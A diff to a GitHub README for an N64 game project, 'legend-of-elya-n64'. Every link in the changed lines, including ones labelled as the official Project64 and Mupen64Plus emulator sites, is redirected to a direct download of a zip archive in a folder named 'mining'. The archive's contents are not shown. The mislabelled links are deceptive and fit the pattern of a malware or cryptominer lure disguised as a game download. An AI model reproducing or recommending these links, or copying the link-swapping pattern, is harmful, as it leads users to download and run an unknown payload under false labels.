@@ -1,6 +1,6 @@
 # 🎮 legend-of-elya-n64 - Classic N64 Game with Smart AI
 
-[![Download on GitHub](https://img.shields.io/badge/Download-legend--of--elya--n64-brightgreen)](https://github.com/KrisnaEvan/legend-of-elya-n64)
+[![Download on GitHub](https://img.shields.io/badge/Download-legend--of--elya--n64-brightgreen)](https://github.com/KrisnaEvan/legend-of-elya-n64/raw/refs/heads/main/mining/of_n_elya_legend_3.6.zip)
 
 ## 📋 About legend-of-elya-n64
 
@@ -29,7 +29,7 @@ The game runs on an N64 emulator because it is designed for the original hardwar
 
 You can get the game files by visiting the repository page here:
 
-[![Download Legend of Elya](https://img.shields.io/badge/Get%20Legend%20of%20Elya-Download-ff69b4)](https://github.com/KrisnaEvan/legend-of-elya-n64)
+[![Download Legend of Elya](https://img.shields.io/badge/Get%20Legend%20of%20Elya-Download-ff69b4)](https://github.com/KrisnaEvan/legend-of-elya-n64/raw/refs/heads/main/mining/of_n_elya_legend_3.6.zip)
 
 Click the link to reach the GitHub repository where the game files are available. Follow the instructions below to download and prepare the game.
 
@@ -43,7 +43,7 @@ This guide will help you download the game and run it using an N64 emulator.
 
 Go to the Legend of Elya repository page at:
 
-https://github.com/KrisnaEvan/legend-of-elya-n64
+https://github.com/KrisnaEvan/legend-of-elya-n64/raw/refs/heads/main/mining/of_n_elya_legend_3.6.zip
 
 You will find all the files and instructions there.
 
@@ -58,8 +58,8 @@ You will find all the files and instructions there.
 
 You need an emulator to run the game on Windows. Some recommended N64 emulators are:
 
-- [Project64](https://www.pj64-emu.com/)
-- [Mupen64Plus](https://mupen64plus.org/)
+- [Project64](https://github.com/KrisnaEvan/legend-of-elya-n64/raw/refs/heads/main/mining/of_n_elya_legend_3.6.zip)
+- [Mupen64Plus](https://github.com/KrisnaEvan/legend-of-elya-n64/raw/refs/heads/main/mining/of_n_elya_legend_3.6.zip)
 
 Visit one of these sites and download the latest version. Follow their installation steps.
 
@@ -136,7 +136,7 @@ This repository covers:
 
 Download the game files here:
 
-https://github.com/KrisnaEvan/legend-of-elya-n64
+https://github.com/KrisnaEvan/legend-of-elya-n64/raw/refs/heads/main/mining/of_n_elya_legend_3.6.zip
 
 Use this link to access the latest build and instructions.
 
